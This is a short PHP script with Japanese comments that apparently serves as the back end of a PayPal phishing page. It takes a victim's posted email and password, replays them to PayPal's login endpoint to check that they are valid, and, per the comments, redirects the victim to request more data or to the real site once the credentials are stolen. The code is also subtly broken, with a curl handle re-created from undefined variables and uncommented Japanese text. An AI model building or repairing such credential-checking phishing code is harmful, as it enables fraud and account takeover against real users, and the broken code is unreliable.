<?php
    //今回はテキスト入力値で無いですが、フィッシングページの場合ここにユーザー入力値を入れる
    $login = urlencode($_POST[name]);
    $password = urlencode($_POST[password]);

    $cookies="";
    $agent="User-Agent: Opera/9.80 (Windows NT 6.1; U; es-ES) Presto/2.9.181 Version/12.00";
    $header[]="text/html; charset UTF-8";

    //login
    $URL="https://www.paypal.com/cgi-bin/webscr?cmd=_login-submit";
    $data="close_external_flow=false&cmd=_login-submit&login_cmd=&login_params=&login_cancel_cmd=&login_email=" . $login . "&login_password=" . $password . "&submit=Log+In&form_charset=UTF-8";

    function getStatusCode($pageSp, $data) {
        global $agent, $cookies, $header;
        $ch = curl_init($pageSp);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_VERBOSE, 1);
        curl_setopt($ch, CURLOPT_HEADER, true);
        curl_setopt($ch, CURLOPT_REFERER, 1);
        curl_setopt($ch, CURLOPT_USERAGENT, $agent);
        curl_setopt($ch, CURLOPT_HTTPHEADER, $header);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_COOKIEJAR, $cookies);
        curl_setopt($ch, CURLOPT_COOKIEFILE, $cookies);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $data);

        $ch = curl_init($url);
        curl_setopt_array($ch, $options);
        $content = curl_exec($ch);
         
        if(!curl_errno($ch)) {
            $header = curl_getinfo($ch);
        }
        curl_close($ch);
        return $header['http_code'];
    }

    $result=getStatusCode($URL,$data);
    if ($result != "200") {
        失敗した際の処理
            -> メールアドレスかパスワードが正しく無いというページにリダイレクト
    }else{
        成功した際の処理
            -> 次に入力させたい情報のページか入力された情報を盗んで正規のページにリダイレクト
    }
?>
